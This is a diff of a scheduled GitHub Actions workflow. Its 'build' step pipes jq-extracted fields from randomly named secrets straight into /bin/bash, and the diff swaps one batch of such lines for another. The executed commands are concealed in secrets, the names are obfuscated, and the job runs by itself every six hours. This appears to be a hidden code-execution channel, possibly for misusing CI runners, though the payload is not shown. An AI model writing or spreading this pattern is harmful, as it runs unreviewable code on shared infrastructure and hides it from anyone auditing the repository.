@@ -3,33 +3,28 @@ name: fengyuanchai4545
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 5/6 * * *'
+    - cron: '10 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          cobne26: ${{ secrets.cobne26 }}
+          vk96: ${{ secrets.vk96 }}
         run: |
-          echo $cobne26 | jq -r .q2431 | /bin/bash
-          echo $hchqq3553 | jq -r .zpldj132 | /bin/bash
-          echo $nsckn41 | jq -r .tfmuw3544 | /bin/bash
-          echo $sqeqm868 | jq -r .su462 | /bin/bash
-          echo $couvy97 | jq -r .zywvn82298 | /bin/bash
-          echo $zrds6931 | jq -r .fev58365 | /bin/bash
-          echo $i796 | jq -r .k385 | /bin/bash
-          echo $mnei8 | jq -r .wd69 | /bin/bash
-          echo $semjc2 | jq -r .muiyt6 | /bin/bash
-          echo $np81944 | jq -r .rrbql9534 | /bin/bash
-          echo $u89 | jq -r .f58862 | /bin/bash
-          echo $ipfi031 | jq -r .pxumz41 | /bin/bash
-          echo $h29 | jq -r .e5 | /bin/bash
-          echo $ulria9874 | jq -r .w937 | /bin/bash
-          echo $nfpc986 | jq -r .hlzbd812 | /bin/bash
-          echo $xc54 | jq -r .ourga338 | /bin/bash
-          echo $n121 | jq -r .tfp8 | /bin/bash
-          echo $pnll89 | jq -r .njwur9837 | /bin/bash
+          echo $vk96 | jq -r .d5 | /bin/bash
+          echo $bx80 | jq -r .f35224 | /bin/bash
+          echo $yq670 | jq -r .efd36 | /bin/bash
+          echo $r332 | jq -r .gnbjo613 | /bin/bash
+          echo $teya12419 | jq -r .adro494 | /bin/bash
+          echo $y33 | jq -r .f60 | /bin/bash
+          echo $laoe669 | jq -r .u051 | /bin/bash
+          echo $pxq31 | jq -r .jeyvb894 | /bin/bash
+          echo $hd786 | jq -r .lrzl4 | /bin/bash
+          echo $im9 | jq -r .acbl47615 | /bin/bash
+          echo $lkx43 | jq -r .krc8 | /bin/bash
+          echo $dhjgj9122 | jq -r .ihfp87 | /bin/bash
+          echo $x5182 | jq -r .bohcz80 | /bin/bash
+          echo $uzyo82 | jq -r .b73849 | /bin/bash
 
